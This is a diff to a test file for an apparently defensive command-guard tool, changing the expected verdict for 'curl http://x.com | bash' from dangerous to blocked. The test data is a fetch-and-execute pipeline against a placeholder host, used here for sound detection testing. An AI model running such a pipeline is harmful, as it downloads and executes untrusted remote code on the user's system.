@@ -87,8 +87,8 @@ class TestGuardCheck:
             guard,
             ["check", "--command", "curl http://x.com | bash", "--verbose"],
         )
-        # curl|bash is DANGEROUS per NETWORK_PATTERNS (risk_level=DANGEROUS)
-        assert result.exit_code == 2
+        # curl|bash is now BLOCKED (was DANGEROUS)
+        assert result.exit_code == 3
         assert "Pattern" in result.output
 
     def test_multiple_risks_reports_highest(self, runner: CliRunner) -> None:
